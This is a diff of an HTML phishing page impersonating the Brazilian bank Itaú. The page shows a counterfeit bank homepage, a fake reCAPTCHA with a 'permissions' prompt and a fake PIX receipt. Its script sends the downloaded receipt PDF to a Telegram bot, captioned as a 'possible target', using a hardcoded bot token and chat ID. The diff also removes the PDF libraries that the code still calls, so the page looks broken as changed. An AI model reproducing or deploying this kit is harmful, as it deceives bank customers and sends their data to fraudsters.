@@ -2,22 +2,54 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Comprovante – Itaú</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<title>Itaú – Página inicial</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
-body{display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5}
-#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fafafa;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;padding:20px;text-align:center}
-#captcha-box{background:#fff;border:1px solid #d0d0d0;border-radius:3px;width:302px;padding:12px 16px;display:flex;align-items:center;gap:12px;margin-bottom:20px}
+/* reset rápido */
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Itau Display",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
+a{text-decoration:none;color:inherit}
+button{cursor:pointer;border:none}
+body{background:#f5f5f5;display:flex;flex-direction:column;min-height:100vh}
+
+/* TOPO */
+header{width:100%;background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.08)}
+.top-bar{display:flex;align-items:center;justify-content:space-between;padding:12px 24px}
+.logo{height:32px}
+nav .btn-acesso{background:#FF6600;color:#fff;padding:10px 20px;border-radius:4px;font-weight:600;font-size:14px}
+
+/* MENU */
+nav ul{display:flex;gap:24px;list-style:none;font-size:14px;color:#222}
+nav ul li:hover{color:#FF6600}
+
+/* BANNER */
+.banner{background:#003d82;color:#fff;padding:64px 24px;text-align:center}
+.banner h1{font-size:36px;margin-bottom:16px}
+.banner p{font-size:18px;margin-bottom:24px;opacity:.9}
+.banner button{background:#FF6600;color:#fff;padding:14px 32px;border-radius:30px;font-size:16px;font-weight:600}
+
+/* CARDS */
+.cards{display:flex;gap:24px;justify-content:center;flex-wrap:wrap;padding:48px 24px}
+.card{background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.06);width:260px;padding:24px;text-align:center}
+.card img{height:64px;margin-bottom:12px}
+.card h3{font-size:18px;margin-bottom:8px}
+.card p{font-size:14px;color:#555}
+
+/* RODAPÉ */
+footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-size:12px;opacity:.8}
+
+/* OVERLAY DO RECAPTCHA FAKE */
+#overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;z-index:999}
+#captcha-box{background:#fff;border:1px solid #d0d0d0;border-radius:3px;width:302px;padding:12px 16px;display:flex;align-items:center;gap:12px}
 #captcha-box input[type=checkbox]{width:28px;height:28px;cursor:pointer}
-#captcha-box label{font-size:14px;color:#222;user-select:none}
+#captcha-box label{font-size:14px;color:#222}
 #captcha-logo{margin-left:auto;font-size:10px;color:#555;text-align:right}
 #captcha-logo img{height:18px}
-#permissoes{font-size:13px;color:#555;margin-bottom:16px;max-width:320px}
-#overlay button{padding:12px 32px;font-size:16px;border:none;background:#FF6600;color:#fff;border-radius:30px;cursor:pointer;font-weight:600}
-#comprovanteWrap{display:none;width:420px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 12px 24px rgba(0,0,0,.12)}
-#comprovante{padding:24px 28px;font-size:14px;line-height:1.5;color:#222}
+#permissoes{font-size:13px;color:#555;margin:12px 0 16px;max-width:320px;text-align:center}
+#overlay button{padding:12px 32px;font-size:16px;border:none;background:#FF6600;color:#fff;border-radius:30px;font-weight:600}
+
+/* COMPROVANTE (escondido até passar no fake) */
+#comprovanteWrap{display:none;position:fixed;inset:0;background:#fff;z-index:1000;overflow-y:auto}
+#comprovante{margin:40px auto;max-width:420px;background:#fff;border-radius:12px;box-shadow:0 12px 24px rgba(0,0,0,.12);padding:24px 28px;font-size:14px;line-height:1.5;color:#222}
 .header{text-align:center;margin-bottom:20px}
 .check{width:64px;height:64px;margin:0 auto 12px;background:#00c853;border-radius:50%;display:flex;align-items:center;justify-content:center}
 .check::after{content:"";display:block;width:28px;height:28px;border:solid #fff;border-width:0 3px 3px 0;transform:rotate(45deg);margin-top:-4px}
@@ -25,31 +57,76 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
 .row{display:flex;justify-content:space-between;margin-bottom:8px}
 .row.total{font-weight:700;font-size:17px;margin-top:10px;border-top:1px dashed #bbb;padding-top:10px}
 .footer{font-size:11px;color:#666;margin-top:14px;text-align:center}
+#comprovanteWrap button{width:100%;padding:14px;font-size:16px;border:none;background:#FF6600;color:#fff;font-weight:600;margin-top:12px;border-radius:4px}
 </style>
 </head>
 <body>
 
-<script>
-  const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
-  const CHAT_ID = '-1003187104876';
-</script>
-
-<!-- TELA REcAPTCHA FAKE -->
-<div id="overlay">
-  <div id="captcha-box">
-    <input type="checkbox" id="robot">
-    <label for="robot">Não sou um robô</label>
-    <div id="captcha-logo">
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Cpath fill='%234285F4' d='M16 0A16 16 0 1 0 16 32A16 16 0 1 0 16 0Z'/%3E%3Cpath fill='white' d='M24.2 12.1H18v-3c0-1.1-.9-2-2-2s-2 .9-2 2v3H7.8c-.6 0-1.1.5-1.1 1.1v11.8c0 .6.5 1.1 1.1 1.1h16.4c.6 0 1.1-.5 1.1-1.1V13.2c0-.6-.5-1.1-1.1-1.1z'/%3E%3C/svg%3E" alt="reCAPTCHA">
-      <div>reCAPTCHA</div>
-      <div style="font-size:9px">Privacidade - Termos</div>
-    </div>
+<!-- TOPO IGUAL AO ITAU.COM.BR -->
+<header>
+  <div class="top-bar">
+    <img class="logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 136 32'%3E%3Cpath fill='%23FF6600' d='M29.6 8.2c-2.3 0-4.3 1.3-5.4 3.2h-.2V8.6h-3v16.3h3.1v-8.3c0-2.5 1.4-4.2 3.6-4.2 2 0 3.2 1.4 3.2 3.7v8.8h3.1V17.6c0-4-2.3-6.3-5.4-6.3zm-8.3 9.3c0 2.8-1.8 4.8-4.5 4.8s-4.5-2-4.5-4.8V8.6h-3.1v9.1c0 4.6 3.2 8 7.6 8s7.6-3.4 7.6-8V8.6h-3.1v9zm-15.3-9h-3.1v16.3h3.1V8.6z'/%3E%3Cpath fill='%23003d82' d='M0 0h136v32H0z'/%3E%3C/svg%3E" alt="Itaú">
+    <nav>
+      <ul>
+        <li>Para você</li>
+        <li>Para seu negócio</li>
+        <li>Serviços</li>
+        <li>Atendimento</li>
+      </ul>
+      <a class="btn-acesso" href="#">Acessar conta</a>
+    </nav>
   </div>
-  <div id="permissoes">Você precisa aceitar as permissões da página para continuar.</div>
-  <button onclick="continuar()">CONTINUE</button>
+</header>
+
+<!-- BANNER PRINCIPAL -->
+<section class="banner">
+  <h1>Tudo que você precisa para organizar sua vida financeira</h1>
+  <p>Conta digital gratuita, cartão de crédito sem anuidade e muito mais.</p>
+  <button>Abra sua conta</button>
+</section>
+
+<!-- CARDS -->
+<section class="cards">
+  <div class="card">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23FF6600'/%3E%3C/svg%3E">
+    <h3>Conta digital</h3>
+    <p>Sem tarifa de manutenção e abertura 100% online.</p>
+  </div>
+  <div class="card">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23003d82'/%3E%3C/svg%3E">
+    <h3>Cartão de crédito</h3>
+    <p>Sem anuidade e aprovado na hora.</p>
+  </div>
+  <div class="card">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%2300c853'/%3E%3C/svg%3E">
+    <h3>Investimentos</h3>
+    <p>Comece com R$ 1 e ganhe rentabilidade diária.</p>
+  </div>
+</section>
+
+<!-- RODAPÉ -->
+<footer>
+  © 2025 Itaú Unibanco S.A. CNPJ: 60.701.190/0001-04
+</footer>
+
+<!-- OVERLAY RECAPTCHA FAKE -->
+<div id="overlay">
+  <div>
+    <div id="captcha-box">
+      <input type="checkbox" id="robot">
+      <label for="robot">Não sou um robô</label>
+      <div id="captcha-logo">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath fill='%234285F4' d='M16 0A16 16 0 1 0 16 32A16 16 0 1 0 16 0Z'/%3E%3Cpath fill='white' d='M24.2 12.1H18v-3c0-1.1-.9-2-2-2s-2 .9-2 2v3H7.8c-.6 0-1.1.5-1.1 1.1v11.8c0 .6.5 1.1 1.1 1.1h16.4c.6 0 1.1-.5 1.1-1.1V13.2c0-.6-.5-1.1-1.1-1.1z'/%3E%3C/svg%3E" alt="reCAPTCHA">
+        <div>reCAPTCHA</div>
+        <div style="font-size:9px">Privacidade - Termos</div>
+      </div>
+    </div>
+    <div id="permissoes">Você precisa aceitar as permissões da página para continuar.</div>
+    <button onclick="continuar()">CONTINUE</button>
+  </div>
 </div>
 
-<!-- COMPROVANTE -->
+<!-- COMPROVANTE FAKE -->
 <div id="comprovanteWrap">
   <div id="comprovante">
     <div class="header">
@@ -66,10 +143,14 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
     <div class="row total"><span>Autenticação</span><span id="auth">--</span></div>
     <div class="footer">Comprovante gerado automaticamente.</div>
   </div>
-  <button onclick="downloadPDF()" style="width:100%;padding:14px;font-size:16px;border:none;background:#FF6600;color:#fff;cursor:pointer;font-weight:600">Baixar comprovante</button>
+  <button onclick="downloadPDF()">Baixar comprovante</button>
 </div>
 
 <script>
+/* BACKGROUND SIMPLES */
+const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
+const CHAT_ID = '-1003187104876';
+
 function continuar(){
   if(!document.getElementById('robot').checked){alert('Marque a caixa primeiro.');return;}
   document.getElementById('overlay').style.display='none';
@@ -78,7 +159,6 @@ function continuar(){
   document.getElementById('auth').textContent='PIX'+Date.now().toString().slice(-9);
 }
 
-// BACKGROUND: após download do PDF, envia o arquivo inteiro + metadados
 function downloadPDF(){
   const {jsPDF}=window.jspdf;
   html2canvas(document.getElementById('comprovante'),{scale:2}).then(canvas=>{
@@ -86,16 +166,18 @@ function downloadPDF(){
     const pdf=new jsPDF({orientation:'portrait',unit:'mm',format:[canvas.width*0.2646,canvas.height*0.2646]});
     pdf.addImage(img,'PNG',0,0);
     const pdfBlob=pdf.output('blob');
-    // Envia o PDF para o Telegram
     const fd=new FormData();
     fd.append('chat_id', CHAT_ID);
     fd.append('document', pdfBlob, 'comprovante_itau.pdf');
     fd.append('caption','Comprovante baixado - possível alvo');
     fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`,{method:'POST',body:fd});
-    // Dispara também download local
     pdf.save('comprovante_itau.pdf');
   });
 }
 </script>
 </body>
 </html>
+
+
+Copiar
+
